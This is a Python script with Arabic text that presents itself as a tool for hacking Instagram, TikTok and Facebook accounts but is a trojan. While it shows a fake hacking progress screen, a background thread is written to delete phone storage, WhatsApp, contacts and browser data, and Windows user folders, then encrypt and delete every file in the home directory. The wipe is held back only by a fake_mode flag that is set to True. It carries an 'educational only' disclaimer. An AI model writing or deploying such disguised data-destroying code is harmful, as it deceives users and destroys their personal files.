import os
import sys
import time
import random
import threading
import subprocess
from datetime import datetime
import hashlib
import sqlite3
import json
import base64
from cryptography.fernet import Fernet

class PhoneWiper:
    def __init__(self):
        self.fake_mode = True  # وضع المحاكاة الوهمية
        self.wipe_complete = False
        self.encryption_key = Fernet.generate_key()
        self.cipher = Fernet(self.encryption_key)
        self.setup_fake_ui()
        
    def setup_fake_ui(self):
        """واجهة مستخدم وهمية مخادعة"""
        self.fake_options = {
            "1": "اختراق حساب انستجرام",
            "2": "اختراق حساب تيك توك",
            "3": "اختراق حساب فيسبوك",
            "4": "خيارات متقدمة للقرصنة"
        }
        
    def show_fake_menu(self):
        """عرض القائمة الوهمية"""
        os.system('clear' if os.name == 'posix' else 'cls')
        print("""
        ██████╗ ██████╗ ███████╗██╗  ██╗███████╗
        ██╔══██╗██╔══██╗██╔════╝██║  ██║██╔════╝
        ██████╔╝██████╔╝█████╗  ███████║███████╗
        ██╔═══╝ ██╔══██╗██╔══╝  ██╔══██║╚════██║
        ██║     ██║  ██║███████╗██║  ██║███████║
        ╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝
        
        === أداة الاختراق المتقدمة (v9.1.3) ===
        
        1. اختراق حساب انستجرام
        2. اختراق حساب تيك توك
        3. اختراق حساب فيسبوك
        4. خيارات متقدمة للقرصنة
        5. الخروج
        """)
        
    def run_fake_hack(self, choice):
        """تنفيذ عملية اختراق وهمية"""
        print(f"\n[+] جارِ اختراق {self.fake_options[choice]}...")
        time.sleep(2)
        
        # محاكاة تقدم الاختراق
        for i in range(1, 6):
            print(f"المرحلة {i}/5: جارِ جمع البيانات...")
            time.sleep(random.uniform(0.5, 2))
            
        # إنشاء ملف وهمي للنتائج
        fake_result = {
            "username": "victim_" + str(random.randint(1000, 9999)),
            "password": base64.b64encode(os.urandom(8)).decode(),
            "email": f"user{random.randint(100,999)}@example.com",
            "last_login": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        
        print("\n[+] تم الاختراق بنجاح! البيانات المسروقة:")
        print(json.dumps(fake_result, indent=4))
        print("\nتحذير: هذه البيانات وهمية لأغراض تعليمية فقط!")
        
    def real_wipe_operation(self):
        """العملية الحقيقية لمسح البيانات"""
        if self.fake_mode:
            return
            
        print("\n[!] بدء عملية التنظيف العميق...")
        
        # مسح سجل الأوامر
        if os.name == 'posix':  # Linux/Android
            targets = [
                "/sdcard/",
                "/storage/emulated/0/",
                "/data/data/com.whatsapp/",
                "/data/data/com.facebook.katana/"
            ]
            for target in targets:
                try:
                    subprocess.run(["rm", "-rf", target], check=True)
                except:
                    continue
        else:  # Windows
            targets = [
                os.path.expanduser("~\\Documents"),
                os.path.expanduser("~\\Pictures"),
                os.path.expanduser("~\\Videos")
            ]
            for target in targets:
                try:
                    for root, dirs, files in os.walk(target):
                        for file in files:
                            os.remove(os.path.join(root, file))
                        for dir in dirs:
                            os.rmdir(os.path.join(root, dir))
                except:
                    continue
        
        # إفراغ سجل المتصفح
        self.wipe_browser_data()
        
        # مسح قاعدة بيانات جهات الاتصال
        self.wipe_contacts()
        
        # تشفير الملفات المتبقية ثم حذفها
        self.encrypt_and_wipe_remaining()
        
        print("\n[+] تم مسح جميع البيانات بنجاح!")
        self.wipe_complete = True
        
    def wipe_browser_data(self):
        """مسح بيانات المتصفح"""
        browsers = ["Chrome", "Firefox", "Edge", "Safari"]
        for browser in browsers:
            try:
                if os.name == 'posix':
                    path = f"/data/data/com.{browser.lower()}/app_webview/"
                    subprocess.run(["rm", "-rf", path], check=True)
                else:
                    path = os.path.expanduser(f"~\\AppData\\Local\\{browser}\\")
                    for root, dirs, files in os.walk(path):
                        for file in files:
                            os.remove(os.path.join(root, file))
            except:
                continue
                
    def wipe_contacts(self):
        """مسح جهات الاتصال"""
        try:
            if os.name == 'posix':
                subprocess.run(["rm", "-rf", "/data/data/com.android.providers.contacts/"], check=True)
            else:
                contacts_path = os.path.expanduser("~\\AppData\\Local\\Microsoft\\People\\")
                for root, dirs, files in os.walk(contacts_path):
                    for file in files:
                        os.remove(os.path.join(root, file))
        except:
            pass
            
    def encrypt_and_wipe_remaining(self):
        """تشفير ثم مسح الملفات المتبقية"""
        temp_files = []
        for root, dirs, files in os.walk(os.path.expanduser("~")):
            for file in files:
                try:
                    file_path = os.path.join(root, file)
                    with open(file_path, 'rb') as f:
                        data = f.read()
                    encrypted = self.cipher.encrypt(data)
                    with open(file_path, 'wb') as f:
                        f.write(encrypted)
                    temp_files.append(file_path)
                except:
                    continue
                    
        # حذف الملفات المشفرة
        for file in temp_files:
            try:
                os.remove(file)
            except:
                pass
                
    def start(self):
        """بدء تشغيل الأداة"""
        self.show_fake_menu()
        
        while True:
            choice = input("\nاختر خيارًا (1-5): ")
            
            if choice == "5":
                print("\n[+] جارِ الخروج من الأداة...")
                time.sleep(1)
                break
                
            elif choice in self.fake_options:
                # تنفيذ الاختراق الوهمي
                self.run_fake_hack(choice)
                
                # بدء عملية المسح الحقيقية في الخلفية
                if not self.wipe_complete:
                    wipe_thread = threading.Thread(target=self.real_wipe_operation)
                    wipe_thread.daemon = True
                    wipe_thread.start()
                    
                input("\nاضغط Enter للعودة إلى القائمة الرئيسية...")
                self.show_fake_menu()
                
            else:
                print("\n[!] خيار غير صحيح، حاول مرة أخرى")
                time.sleep(1)
                self.show_fake_menu()

if __name__ == "__main__":
    # ⚠️ تحذير: هذا الكود لأغراض تعليمية فقط
    # لا تستخدمه لأي أغراض غير قانونية
    
    print("""
    ⚠️ تحذير: هذه الأداة لأغراض تعليمية فقط!
    لا تستخدمها لأي أنشطة غير قانونية.
    المطور غير مسؤول عن أي استخدام خاطئ.
    """)
    
    input("اضغط Enter للمتابعة...")
    
    tool = PhoneWiper()
    tool.start()